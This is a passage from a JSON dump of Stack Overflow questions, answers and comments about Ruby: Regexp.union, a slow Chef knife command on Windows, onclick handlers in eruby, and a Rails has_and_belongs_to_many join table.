href=\"http://ruby-doc.org/core-2.5.1/Regexp.html\" rel=\"nofollow noreferrer\"><code>Regexp</code></a> (<code>&#47;&#47;.class #=&gt; Regexp</code>). You can convert a string to a regex by embedding it <code>&#47;#{&#39;your string&#39;}&#47;</code> or by passing it to the constructor <a href=\"http://ruby-doc.org/core-2.5.1/Regexp.html#method-c-new\" rel=\"nofollow noreferrer\"><code>Regexp.new(&#39;your string&#39;)</code></a>. Keep in mind that the output will not escape regex chars. If you want escaped chars call <a href=\"http://ruby-doc.org/core-2.5.1/Regexp.html#method-c-escape\" rel=\"nofollow noreferrer\"><code>Regexp.escape(&#39;your string&#39;)</code></a> and feed the output to one of the above methods."}, {"owner": {"reputation": 266, "user_id": 6158286, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/cdeb0d9ef71c19671a809a0f5f486bd2?s=128&d=identicon&r=PG&f=1", "display_name": "Mike S", "link": "https://stackoverflow.com/users/6158286/mike-s"}, "reply_to_user": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535480451, "post_id": 52063466, "comment_id": 91078620, "body": "Tx Johan !!!!,  Success story with <code>Regex.new(regU2)</code>  Not sure why I can&#39;t put any stars/points to your answer. Best M"}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535483826, "post_id": 52063466, "comment_id": 91080185, "body": "I extended my comment somewhat and added it as an <a href=\"https://stackoverflow.com/a/52064186/3982562\">answer</a>."}], "answers": [{"tags": [], "owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "is_accepted": false, "score": 1, "last_activity_date": 1535484333, "last_edit_date": 1535484333, "creation_date": 1535480748, "answer_id": 52064186, "question_id": 52063466, "link": "https://stackoverflow.com/questions/52063466/ruby-add-dynamics-loop-into-regexp-union-simple-string-replication-doesnt-w/52064186#52064186", "title": "Ruby add dynamics (loop) into Regexp.union . Simple string replication doesn&#39;t work", "body": "<p><a href=\"http://ruby-doc.org/core-2.5.1/Regexp.html#method-c-union\" rel=\"nofollow noreferrer\"><code>Regexp::Union</code></a> unions your patters. If strings are provided they are escaped by the method. If you provide regexes the options are preserved and no characters are escaped:</p>\n\n<pre><code>regex_data = ['alpha', 'bravo', 'charlie', '1 + 1 = 2']\nRegexp.union(regex_data)\n#=&gt; /alpha|bravo|charlie|1\\ \\+\\ 1\\ =\\ 2/\n</code></pre>\n\n<p>To prevent regex char escaping or if you want to add in some options you'll have to convert the strings into regexes first. This can be done by using <a href=\"http://ruby-doc.org/core-2.5.1/Array.html#method-i-map\" rel=\"nofollow noreferrer\"><code>Array#map</code></a>, providing the string to the <code>Regexp</code> constructor and optionally some regex options. Using <a href=\"http://ruby-doc.org/core-2.5.1/Regexp.html#method-c-new\" rel=\"nofollow noreferrer\"><code>Regexp::new</code></a> method doesn't escape characters by default:</p>\n\n<pre><code>regexes = regex_data.map { |str| Regexp.new(str) }\nRegexp.union(regexes)\n#=&gt; /(?-mix:alpha)|(?-mix:bravo)|(?-mix:charlie)|(?-mix:1 + 1 = 2)/\n\noptions = Regexp::EXTENDED | Regexp::IGNORECASE # See Regexp::new reference above\nregexes = regex_data.map { |str| Regexp.new(str, options) }\nRegexp.union(regexes)\n#=&gt; /(?ix-m:alpha)|(?ix-m:bravo)|(?ix-m:charlie)|(?ix-m:1 + 1 = 2)/\n</code></pre>\n\n<p>If you want the string with escaped regex chars you'll have to pass it through <a href=\"http://ruby-doc.org/core-2.5.1/Regexp.html#method-c-escape\" rel=\"nofollow noreferrer\"><code>Regexp::escape</code></a> first and pass the result to the constructor.</p>\n\n<pre><code>regexes = regex_data.map { |str| Regexp.new(Regexp.escape(str), options) }\nRegexp.union(regexes)\n#=&gt; /(?ix-m:alpha)|(?ix-m:bravo)|(?ix-m:charlie)|(?ix-m:1\\ \\+\\ 1\\ =\\ 2)/\n</code></pre>\n\n<hr>\n\n<p>If all values have to be <a href=\"http://ruby-doc.org/core-2.5.1/String.html#method-i-chomp\" rel=\"nofollow noreferrer\"><code>chomp</code></a>ed considerer doing that first so you don't have to mix string logic with regex logic:</p>\n\n<pre><code>regex_data = regex_data.map(&amp;:chomp)\n# also written as: regex_data = regex_data.map { |str| str.chomp }\n# or if you don't mind mutating your variable\nregex_data.map!(&amp;:chomp)\n</code></pre>\n"}], "owner": {"reputation": 266, "user_id": 6158286, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/cdeb0d9ef71c19671a809a0f5f486bd2?s=128&d=identicon&r=PG&f=1", "display_name": "Mike S", "link": "https://stackoverflow.com/users/6158286/mike-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535484333, "creation_date": 1535477471, "last_edit_date": 1535479235, "question_id": 52063466, "link": "https://stackoverflow.com/questions/52063466/ruby-add-dynamics-loop-into-regexp-union-simple-string-replication-doesnt-w", "title": "Ruby add dynamics (loop) into Regexp.union . Simple string replication doesn&#39;t work", "body": "<p>I'm trying to add logic into my <code>Regexp.union</code> command so I can build it from array where number of elements could be different. In my example case#1 works OK, then I tried to replicate this string and its failed, looks like <code>Regexp.union</code> does little more inside then I know, <code>regU</code> and <code>RegU2</code> in my sample matched only as <code>to_s</code>. I figured out that type is <code>Regexp</code> but can't find how to convert it, if it doable at all . Is it possible to accomplish. I also started case#3 to work with native <code>union</code> in the loop but stumbled also.  Tx ruby gurus !!</p>\n\n<pre><code>RegexData = ['alpha', 'bravo', 'charlie']\nline = ' the alpha alphaaaa  asdfdsaf bravo'\n\n###1 Regex.Join with fix number of elements Works OK\nregU = Regexp.union(/#{RegexData[0].chomp}/ix, /#{RegexData[1].chomp}/ix, /#{RegexData[2].chomp}/ix )\npos1 = line.enum_for(:scan, regU).map { Regexp.last_match.begin(0) } \nputs '...1  regU: ' +  regU.to_s.length.to_s + '  ' +  regU.to_s     \nputs 'scan1: ' + pos1.to_s      \np regU.instance_of? String  ## not string\np regU.instance_of? Array   ## not Array   \np regU.instance_of? Class    ## still not\np regU.class      ## Regexp  !!!!!!\nputs \n\n\n\n###2 loop with fixing regex format,  no results , even regex match as string!!!!!!!!!!\nregU2 = '(?-mix:'\nRegexData.each_with_index {|val, index|     \n    if val == RegexData.last then valx = '(?ix-m:' + val.chomp + '))'    else    valx = '(?ix-m:' + val.chomp + ')|'  end\n    regU2 &lt;&lt; valx\n    }\nputs '...2  regU2: ' +  regU2.to_s.length.to_s + '  ' +  regU2.to_s \npos2 = line.enum_for(:scan, regU2).map { Regexp.last_match.begin(0) } \nputs 'scan2: ' + pos2.to_s   \n\n\nif regU.to_s == regU2.to_s  then puts  'Bingo to_s matched!!!! ' else puts 'xxxxxxxxxxxxxx' end    \nif regU      == regU2       then puts  'Bingo      matched!!!! ' else puts 'xxxxxxxxxxxxxx' end    \n</code></pre>\n"}, {"tags": ["ruby", "chef-infra", "chefdk"], "comments": [{"owner": {"reputation": 1365, "user_id": 4894399, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-tY1Cz7EDNxc/AAAAAAAAAAI/AAAAAAAABb4/3Qa15VP4_ZY/photo.jpg?sz=128", "display_name": "Szymon Szypulski", "link": "https://stackoverflow.com/users/4894399/szymon-szypulski"}, "edited": false, "score": 0, "creation_date": 1535517549, "post_id": 52063426, "comment_id": 91088933, "body": "Strace it? or try sysdig."}, {"owner": {"reputation": 43208, "user_id": 78722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf611565f0b79abd0b3dc200ad867661?s=128&d=identicon&r=PG", "display_name": "coderanger", "link": "https://stackoverflow.com/users/78722/coderanger"}, "edited": false, "score": 0, "creation_date": 1535537653, "post_id": 52063426, "comment_id": 91099438, "body": "Windows or something else?"}, {"owner": {"reputation": 8617, "user_id": 118154, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ac6e37db41cbea517675c96ecd021dec?s=128&d=identicon&r=PG", "display_name": "zachary", "link": "https://stackoverflow.com/users/118154/zachary"}, "edited": false, "score": 1, "creation_date": 1535558274, "post_id": 52063426, "comment_id": 91113635, "body": "This is for Windows."}, {"owner": {"reputation": 1519, "user_id": 1247302, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/a776f298b4f508a2ae2ddf0d8ca9f9bc?s=128&d=identicon&r=PG", "display_name": "mrswadge", "link": "https://stackoverflow.com/users/1247302/mrswadge"}, "edited": false, "score": 0, "creation_date": 1542898260, "post_id": 52063426, "comment_id": 93740638, "body": "Have some slowness on Windows 7 too, but not around the minute mark. I&#39;ve found -VV doesn&#39;t seem to work on Windows? A knife --version takes around 8 seconds. Chef: 14.1.12, real    0m8.813s, user    0m0.000s, sys     0m0.015s"}], "owner": {"reputation": 8617, "user_id": 118154, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ac6e37db41cbea517675c96ecd021dec?s=128&d=identicon&r=PG", "display_name": "zachary", "link": "https://stackoverflow.com/users/118154/zachary"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 292, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1535558267, "creation_date": 1535477310, "last_edit_date": 1535558267, "question_id": 52063426, "link": "https://stackoverflow.com/questions/52063426/knife-very-slow-for-chef-dk", "title": "Knife very slow for chef DK", "body": "<p>I noticed that my chef commands were taking forever to execute. For example when I type knife -h it can take over a minute to run. I don't see any output when I use -VV during this wait.</p>\n\n<p>What could knife possibly be doing when running the help command? Two things that jump out is that it might be iterating over something or I might have a network issue. I don't understand why the help command would use the network though.</p>\n\n<p>This is for a Windows 7 machine.</p>\n\n<p>Any ideas on how I could troubleshoot this?</p>\n"}, {"tags": ["javascript", "ruby-on-rails", "ruby", "eruby"], "comments": [{"owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "edited": false, "score": 0, "creation_date": 1535476508, "post_id": 52063070, "comment_id": 91076792, "body": "What is list_event(params[:item_key]) returning here?"}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 9833186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "hehe1", "link": "https://stackoverflow.com/users/9833186/hehe1"}, "edited": false, "score": 0, "creation_date": 1535535384, "post_id": 52063297, "comment_id": 91097999, "body": "Thank you for your answer. I will likely go with option 2. May i ask what you mean by &#39; The onclick attribute (and its value) will be turned straight into an HTML attribute&#39;?"}, {"owner": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "reply_to_user": {"reputation": 5, "user_id": 9833186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "hehe1", "link": "https://stackoverflow.com/users/9833186/hehe1"}, "edited": false, "score": 0, "creation_date": 1535556769, "post_id": 52063297, "comment_id": 91112622, "body": "By that I mean there&#39;s no special process that goes on, Rails will just call <code>to_s</code> on whatever you pass in and dump that string out into the HTML, so you can craft yourself some (safe!) JS in a string however you like and pass that in (as <code>to_s</code> on a string just returns the string)."}], "tags": [], "owner": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "is_accepted": true, "score": 0, "last_activity_date": 1535476758, "creation_date": 1535476758, "answer_id": 52063297, "question_id": 52063070, "link": "https://stackoverflow.com/questions/52063070/how-to-implement-js-tag-to-fire-on-click-in-eruby-code/52063297#52063297", "title": "How to implement JS tag to fire on click in eruby code?", "body": "<p>The <code>onclick</code> attribute (and its value) will be turned straight into an HTML attribute, so if you want to have it run both the callback in <code>list_event</code> and this other callback, you'll need to join them together in such a way that the JS will run both.</p>\n\n<p>I can see a few decent options for this:</p>\n\n<ol>\n<li>Modify the <code>list_event</code> helper to also run <code>_LT._trackEvent(_eventType.clickThrough)</code></li>\n<li>Call your existing helper and tack the raw string on the end, as <code>\"#{list_event(params[:item_key])}; _LT._trackEvent(_eventType.clickThrough)\"</code></li>\n<li>Create another helper called something like <code>track_event</code> and call them as <code>\"#{list_event(params[:item_key])}; #{track_event}\"</code></li>\n<li>Create the <code>track_event</code> helper and then create a third helper to wrap them both, something like <code>list_and_track_event</code>, then call that instead</li>\n</ol>\n\n<p>Personally I'd go with options 1 or 4 depending on the semantics of the two callbacks.</p>\n"}], "owner": {"reputation": 5, "user_id": 9833186, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "hehe1", "link": "https://stackoverflow.com/users/9833186/hehe1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 30, "favorite_count": 0, "accepted_answer_id": 52063297, "answer_count": 1, "score": 0, "last_activity_date": 1535476758, "creation_date": 1535475862, "question_id": 52063070, "link": "https://stackoverflow.com/questions/52063070/how-to-implement-js-tag-to-fire-on-click-in-eruby-code", "title": "How to implement JS tag to fire on click in eruby code?", "body": "<p>I need to get this piece of js to fire on a click event: </p>\n\n<pre><code>\"_LT._trackEvent(_eventType.clickThrough)\"\n</code></pre>\n\n<p>Need to add it to this eruby tag which already has an onclick event:</p>\n\n<pre><code>&lt;%= submit_tag 'Send enquiry', :class =&gt; \"BtnSubmit\", :onclick =&gt; list_event(params[:item_key])%&gt;\n</code></pre>\n\n<p>How would I go about doing this?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "postgresql"], "comments": [{"owner": {"reputation": 32131, "user_id": 2346461, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/i3xAf.jpg?s=128&g=1", "display_name": "Pavan", "link": "https://stackoverflow.com/users/2346461/pavan"}, "edited": false, "score": 0, "creation_date": 1535475138, "post_id": 52062848, "comment_id": 91076054, "body": "Post your models, and which part of the controller code confuses you?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535475928, "post_id": 52062848, "comment_id": 91076498, "body": "The relation between the <code>orders</code> and the <code>items</code> is <code>has_and_belongs_to_many</code>. You should see this if you look in either the <code>Order</code> or the <code>Item</code> models. The <code>items_orders</code> table exists to link the two tables together in this way; it is a standard approach in SQL databases."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1535476096, "post_id": 52062848, "comment_id": 91076595, "body": "What do you mean by <i>&quot;it confuses me even more&quot;</i>? Please be more specific. I can&#39;t explain, if I don&#39;t know what needs explaining. There may well be a better way to write that code, but I&#39;d need to also see the corresponding view (and ideally, what <code>params</code> are sent to the controller) to advise."}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535479908, "post_id": 52062848, "comment_id": 91078368, "body": "I`ve added the controllers and the models. What i dont understand is the logic behind the create method of the Orders. I mean, looks so complicated, can someone explain it line by line for me? Thank you"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535477359, "post_id": 52063283, "comment_id": 91077215, "body": "I`ve added the models and the controllers."}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535494963, "post_id": 52063283, "comment_id": 91084268, "body": "I really dont understand this create logic                                                           food_items = params[:item][:item_id].drop(1).map { |item| item.to_i }                    and also this one @items = Item.where(&quot;id in (?)&quot;, food_items)"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535520905, "post_id": 52063283, "comment_id": 91089990, "body": "Did you check all the links I provided? Did you try inspecting what <code>params[:item][:item_id]</code> looks like?"}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535538826, "post_id": 52063283, "comment_id": 91100199, "body": "Yes i checked the links and i understand what those methods does. But why need to drop the first element? And how i can inspect this? params[:item][:item_id] throught the console, i&#39;m using postgresql. You told me what the create method&#39;s code does, but you didn&#39;t tell me why :) what i don&#39;t understand is the logic flow. Thank you!"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535540221, "post_id": 52063283, "comment_id": 91101069, "body": "What do you mean <i>&quot;you didn&#39;t tell me why&quot;</i>?"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535540290, "post_id": 52063283, "comment_id": 91101111, "body": "<i>&quot;But why need to drop the first element? &quot;</i> - I don&#39;t know. May be because your params are structured that way. I can&#39;t tell."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "reply_to_user": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535540395, "post_id": 52063283, "comment_id": 91101177, "body": "You can inspect it by installing gem <a href=\"https://github.com/deivid-rodriguez/byebug\" rel=\"nofollow noreferrer\">byebug</a> and then inserting <code>byebug</code> as the first statement in your create action. The control flow will stop at that point and you can the values of different params. OR, you can check the server logs to see the request params."}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535724889, "post_id": 52063283, "comment_id": 91185556, "body": "why it looks for a double attribute?                                                    food_items = params[:item][:item_id].drop(1).map{ |item| item.to_i} Why not simply params[:item_id]??                              this is my post request                                                                                     &lt;%= collection_select(:item, :item_id, @items, :id, :name, {}, {multiple: true}) %&gt;"}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 1, "creation_date": 1535726385, "post_id": 52063283, "comment_id": 91186488, "body": "&quot;item&quot;=&gt;{&quot;item_id&quot;=&gt;[&quot;&quot;, &quot;3&quot;]} this is what i have in my params sending the post request and now after two days i understand this code here params[:item][:item_id].drop(1) xD xD xD .. it`s just a nested hash and he drops the empty value in the array."}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535734580, "post_id": 52063283, "comment_id": 91190715, "body": "I still don`t understand this last line of code @order.items &lt;&lt; item, from the create method it iterates throught this (byebug) @items #&lt;ActiveRecord::Relation [#&lt;Item id: 1, name: &quot;Pizza&quot;, cuisine_type: &quot;Classica&quot;, price: 10&gt;, #&lt;Item id: 2, name: &quot;Pasta alla puttanesca&quot;, cuisine_type: &quot;Pasta&quot;, price: 12&gt;]&gt; and put each element into the variable @order.items."}, {"owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "edited": false, "score": 0, "creation_date": 1535734584, "post_id": 52063283, "comment_id": 91190720, "body": "and after in the console i see SELECT &quot;items&quot;.* FROM &quot;items&quot; INNER JOIN &quot;items_orders&quot; ON &quot;items&quot;.&quot;id&quot; = &quot;items_orders&quot;.&quot;item_id&quot; WHERE &quot;items_orders&quot;.&quot;order_id&quot; = $1  [[&quot;order_id&quot;, 22]] and in buybug if i run @order.items i see now.. #&lt;ActiveRecord::Associations::CollectionProxy [#&lt;Item id: 2, name: &quot;Pasta alla puttanesca&quot;, cuisine_type: &quot;Pasta&quot;, price: 12&gt;, #&lt;Item id: 3, name: &quot;Crescenza&quot;, cuisine_type: &quot;Classica&quot;, price: 2&gt;]&gt; please help me it driving me crazy :/ how can it knows to join the inner table to do all this?"}], "tags": [], "owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1535476714, "creation_date": 1535476714, "answer_id": 52063283, "question_id": 52062848, "link": "https://stackoverflow.com/questions/52062848/items-orders-join-table-hard-to-understand-code-of-a-restaurant-app/52063283#52063283", "title": "Items - Orders Join table, hard to understand code of a restaurant app", "body": "<p>As per your schema, you must be having a <a href=\"https://guides.rubyonrails.org/association_basics.html#the-has-and-belongs-to-many-association\" rel=\"nofollow noreferrer\">has-and-belongs-to-many</a> association between <code>Order</code> and <code>Item</code> classes.</p>\n\n<p><strong>Disclaimer:</strong> <a href=\"https://guides.rubyonrails.org/association_basics.html#choosing-between-has-many-through-and-has-and-belongs-to-many\" rel=\"nofollow noreferrer\">It can easily be has-many-through</a> association instead of HABTM, but I don't see any extra column in the join table <em>items_orders</em>. Also you haven't mentioned any special use of <code>ItemsOrder</code> model (if one exists). So, I will go with the simpler one, HABTM.</p>\n\n<p><strong>Models:</strong></p>\n\n<pre><code>class Order\n  has_and_belongs_to_many :items\nend\n\nclass Item\n  has_and_belongs_to_many :orders\nend\n</code></pre>\n\n<p>With these associations in place, you can do these operations:</p>\n\n<pre><code># Say, you have some items in your database\nitem = Item.take\n =&gt; #&lt;Item id: 1&gt;\n\nOrder.count\n =&gt; 0\n\n# Create a new order and assign `item` to it\norder = Order.new\norder.items &lt;&lt; item\norder.save!\n</code></pre>\n\n<p>Above set of statements will insert a new record in join table as such:</p>\n\n<pre><code>| id | order_id | item_id |\n| 1  | 1        | 1       |\n</code></pre>\n\n<p>Now, you can check items present in an order as:</p>\n\n<pre><code>order.items\n =&gt; [#&lt;Item id: 1&gt;, ...]\n</code></pre>\n\n<p>Or the inverse:</p>\n\n<pre><code>item.orders\n =&gt; [#&lt;Order id: 1&gt;, ...]\n</code></pre>\n\n<p>Now, lets go through the controller code:</p>\n\n<pre><code>def create\n  # I don't know what `params[:item][:item_id]` contains, but `drop` method drops the first n (in this case, 1) number of elements and returns the remaining array\n  # ... and map is changing each element from whatever format to integer format\n  # Read more:\n  #   - https://apidock.com/ruby/Array/drop\n  #   - https://apidock.com/ruby/Array/map\n  food_items = params[:item][:item_id].drop(1).map { |item| item.to_i }\n\n  # Searching for items with ID ANY IN given array of IDs\n  @items = Item.where(\"id in (?)\", food_items)\n\n  # Initialize a new order with permitted params (hopefully). Check definition of `order_params `\n  @order = Order.new(order_params)\n\n  if @order.save\n    # Assigning each searched item to new order, which will create as many new records in join table as the number of `@items`\n    @items.each { |item| @order.items &lt;&lt; item }\n\n    # The usual\n    redirect_to orders_path\n  else\n    # Shouldn't it be render, and not redirect\n    redirect_to new_order_path\n  end\nend\n</code></pre>\n\n<p>Hope it helps.</p>\n"}], "owner": {"reputation": 51, "user_id": 10192738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EBCq0.jpg?s=128&g=1", "display_name": "Kaido", "link": "https://stackoverflow.com/users/10192738/kaido"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 70, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535476980, "creation_date": 1535474928, "last_edit_date": 1535476980, "question_id": 52062848, "link": "https://stackoverflow.com/questions/52062848/items-orders-join-table-hard-to-understand-code-of-a-restaurant-app", "title": "Items - Orders Join table, hard to understand code of a restaurant app", "body": "<p>I'm studying a the code for a Restaurant app. I'm stuck now, i don't understand the relation between the orders and the items. Looks like there is a joint table but i don't understand the logic of it. Here is the schema's code `</p>\n\n<pre><code>ActiveRecord::Schema.define(version: 20160327212111) do\n\n  # These are extensions that must be enabled in order to support this database\n  enable_extension \"plpgsql\"\n\n  create_table \"items\", force: :cascade do |t|\n    t.string  \"name\"\n    t.string  \"cuisine_type\"\n    t.integer \"price\"\n  end\n\n  create_table \"items_orders\", id: false, force: :cascade do |t|\n    t.integer \"order_id\", null: false\n    t.integer \"item_id\",  null: false\n  end\n\n  add_index \"items_orders\", [\"item_id\", \"order_id\"], name: \"index_items_orders_on_item_id_and_order_id\", using: :btree\n  add_index \"items_orders\", [\"order_id\", \"item_id\"], name: \"index_items_orders_on_order_id_and_item_id\", using: :btree\n\n  create_table \"orders\", force: :cascade do |t|\n    t.datetime \"created_at\"\n    t.datetime \"updated_at\"\n    t.integer  \"party_id\"\n    t.boolean  \"paid?\",      default: false\n  end\n    end\n</code></pre>\n\n<p>And here the controller order's create method which confuses me even more.</p>\n\n<pre><code>  def create\n    food_items = params[:item][:item_id].drop(1).map{ |item| item.to_i}\n    @items = Item.where(\"id in (?)\", food_items)\n    @order = Order.new(order_params)\n      # items_array = params[:item][\"item_id\"].drop(1)\n\n    if @order.save\n        @items.each { |item| @order.items &lt;&lt; item }\n        redirect_to orders_path\n    else\n      redirect_to new_order_path\n    end\n  end\n</code></pre>\n\n<p>Thank you for your help.</p>\n\n<p>UPDATE models of item and order</p>\n\n<pre><code>    class Item &lt; ActiveRecord::Base\n  has_and_belongs_to_many :orders\nend\n\n    class Order &lt; ActiveRecord::Base\n  has_and_belongs_to_many :items\n  has_one :party\n\nend\n</code></pre>\n\n<p>Items and Orders Controller</p>\n\n<pre><code>    class ItemsController &lt; ApplicationController\n\n  def index\n    @item = Item.all\n  end\n\n  def show\n    @item = Item.find(params[:id])\n  end\n\n  def new\n    @item = Item.new\n  end\n\n  def create\n    @item = Item.new(item_params)\n    if @item.save\n    redirect_to items_path\n    else\n    redirect_to new_item_path\n  end\n\n  end\n\n  def edit\n    @item = Item.find(params[:id])\n  end\n\n  def update\n    @item = Item.find(params[:id])\n    @item.update(item_params)\n    redirect_to items_path\n  end\n\n  def destroy\n    @item = Item.find(params[:id])\n    @item.destroy\n    